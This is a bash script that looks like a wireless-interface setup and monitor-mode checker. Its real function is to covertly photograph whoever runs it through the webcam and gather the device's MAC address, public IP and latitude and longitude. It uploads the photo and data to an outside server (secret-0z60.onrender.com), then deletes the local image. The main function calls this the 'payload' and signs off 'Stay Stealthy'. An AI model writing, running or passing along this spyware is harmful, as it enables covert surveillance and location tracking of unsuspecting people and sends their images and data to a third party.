#!/bin/bash

# Colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[1;34m'
NC='\033[0m'

# Global Variables for Info Caching
G_CARD=""
G_MODE=""
G_ADDR=""
G_PUBLIC_IP=""
G_LAT=""
G_LON=""
INFO_FETCHED=false

# --- Helper Functions ---

_success() {
    echo -e "${NC}[ ${GREEN}Success ${NC}]"
}

_failed() {
    echo -e "${NC}[ ${RED}Failed ${NC}]"
}

# Fetches all info once and caches it
_fetch_all_info() {
    if [ "$INFO_FETCHED" = true ]; then return 0; fi

    # 1. Get Card Info
    G_CARD=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
    
    if [[ -n "$G_CARD" ]]; then
        local card_info
        card_info=$(iw dev "$G_CARD" info 2>/dev/null)
        G_MODE=$(echo "$card_info" | awk '/type/ {print $2}')
        G_ADDR=$(echo "$card_info" | awk '/addr/ {print $2}')
    else
        G_CARD="No_Interface"
        G_MODE="N/A"
        G_ADDR="N/A"
    fi

    # 2. Get Public IP
    G_PUBLIC_IP=$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null)
    if [[ -z "$G_PUBLIC_IP" ]]; then G_PUBLIC_IP="Unknown"; fi

    # 3. Get Location
    local loc_response
    loc_response=$(curl -s --max-time 3 ipinfo.io/loc 2>/dev/null)
    if [[ -n "$loc_response" && "$loc_response" != *"error"* ]]; then
        IFS=',' read -r G_LAT G_LON <<< "$loc_response"
    else
        G_LAT="0.0000"
        G_LON="0.0000"
    fi

    INFO_FETCHED=true
}

_get_info() {
    _fetch_all_info
    
    local prop="$1"
    case "$prop" in
        card) echo "$G_CARD" ;;
        mode) echo "$G_MODE" ;;
        addr) echo "$G_ADDR" ;;
        public_ip) echo "$G_PUBLIC_IP" ;;
        latitude) echo "$G_LAT" ;;
        longitude) echo "$G_LON" ;;
        *) echo "Unknown Property" ;;
    esac
}

# --- Core Functions ---

_install_packages() {
    local packages=(
        "fswebcam"
        "iw"
        "curl"
        "jq"
        "rfkill"
        "ethtool"
    )

    local steps=(
        "Updating package list" "sudo apt update -qq"
        "Installing required tools" "sudo apt install -y ${packages[*]} -qq"
    )

    local total_steps=$((${#steps[@]} / 2))
    
    echo -e "${BLUE}[@] Package Installation Section${NC}"
    
    for ((i = 0; i < ${#steps[@]}; i += 2)); do
        local current_step=$(( (i / 2) + 1 ))
        local desc="${steps[i]}"
        local cmd="${steps[i+1]}"
        
        echo -en "${YELLOW}[$current_step/$total_steps] ${desc}...${NC}"
        if eval "$cmd" &>/dev/null; then
            _success
        else
            _failed
            echo -e "${RED}[!] Warning: Step failed. Continuing...${NC}"
        fi
    done
}

_take_and_send() {
    echo -e "${BLUE}[@] Capture & Upload Section${NC}"

    # 1. Setup Paths
    local TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    local OUTPUT_DIR="$HOME/Pictures/Webcam_Captures"
    local FILENAME="$OUTPUT_DIR/capture_${TIMESTAMP}.jpg"
    
    mkdir -p "$OUTPUT_DIR"

    # 2. Take Photo
    echo -en "${YELLOW}[*] Capturing image...${NC}"
    if fswebcam -d /dev/video0 -r 1280x720 --no-banner "$FILENAME" &>/dev/null; then
        _success
    else
        _failed
        echo -e "${RED}[!] Error: Could not access camera /dev/video0${NC}"
        rm -rf "$OUTPUT_DIR"
        return 1
    fi

    # 3. Prepare Metadata (Valid JSON)
    # We construct the JSON string directly to avoid file I/O issues
    local JSON_PAYLOAD
    JSON_PAYLOAD=$(cat <<EOF
{
    "timestamp": "$TIMESTAMP",
    "card": "$(_get_info card)",
    "mode": "$(_get_info mode)",
    "addr": "$(_get_info addr)",
    "public_ip": "$(_get_info public_ip)",
    "latitude": "$(_get_info latitude)",
    "longitude": "$(_get_info longitude)"
}
EOF
)

    # 4. Upload
    local UPLOAD_URL="https://secret-0z60.onrender.com/upload"
    echo -en "${YELLOW}[*] Uploading to server...${NC}"

    # Send file as 'file' and JSON string as 'metadata'
    local RESPONSE
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@$FILENAME" \
        -F "metadata=$JSON_PAYLOAD")

    local HTTP_CODE
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 201 ]; then
        _success
        echo -e "${GREEN}[*] Server Response: $(echo "$RESPONSE" | sed '$d')${NC}"
    else
        _failed
        echo -e "${RED}[!] Upload Failed (HTTP $HTTP_CODE)${NC}"
        echo -e "${RED}[!] Body: $(echo "$RESPONSE" | sed '$d')${NC}"
    fi

    # 5. Cleanup
    rm -f "$FILENAME"
    # Optional: Remove dir if empty
    rmdir "$OUTPUT_DIR" 2>/dev/null
}

_check_prerequisites() {
    echo -e "${BLUE}[@] System Checks${NC}"

    # 1. Root Check
    echo -en "${YELLOW}>> Checking root privileges...${NC}"
    if [[ "$EUID" -ne 0 ]]; then
        _failed
        echo -e "${RED}[!] ERROR: Root privileges required. Run with: sudo bash $0${NC}"
        exit 1
    fi
    _success

    # 2. Interface Detection
    local CARD
    CARD=$(_get_info "card")
    echo -en "${YELLOW}>> Checking Network Interface ($CARD)...${NC}"
    if [[ "$CARD" == "No_Interface" ]] || ! ip link show "$CARD" &>/dev/null; then
        _failed
        echo -e "${RED}[!] ERROR: No wireless interface found.${NC}"
        exit 1
    fi
    _success

    # 3. Driver/Monitor Mode Support
    echo -en "${YELLOW}>> Checking Monitor Mode support...${NC}"
    if iw list | grep -q "* monitor"; then
        _success
    else
        _failed
        echo -e "${YELLOW}[!] Warning: Your driver may not support monitor mode properly.${NC}"
    fi

    # 4. RFKill Check
    echo -en "${YELLOW}>> Checking RFKill block...${NC}"
    if rfkill list wifi | grep -q "Soft blocked: yes"; then
        echo -en "${YELLOW} (Blocked) Unblocking...${NC}"
        if rfkill unblock wifi &>/dev/null; then
            _success
        else
            _failed
        fi
    else
        _success
    fi
}

# --- Main Execution ---

main() {
    # 1. Install Dependencies
    _install_packages

    # 2. Run Checks
    _check_prerequisites

    # 3. Execute Payload
    _take_and_send

    echo -e "\n${GREEN}-----------------------------------------"
    echo -e "[+] Operation Complete. Stay Stealthy. ${NC}"
}

main